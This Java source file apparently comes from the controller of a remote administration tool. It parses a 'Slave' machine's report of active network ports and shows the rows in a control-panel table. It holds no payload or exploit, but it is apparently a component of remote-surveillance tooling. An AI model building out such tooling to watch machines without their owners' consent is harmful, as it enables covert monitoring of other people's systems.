package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlActivePorts;

public class PacketAPORT extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String prot = slave.readLine();
		String la = slave.readLine();
		String ext = slave.readLine();
		String status = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		
		if (frame != null) {
			PanelControlActivePorts panel = (PanelControlActivePorts) frame.panels.get("active ports");
			panel.getModel().addRow(new Object[] { prot, la, ext, status });
		}
		
	}

}
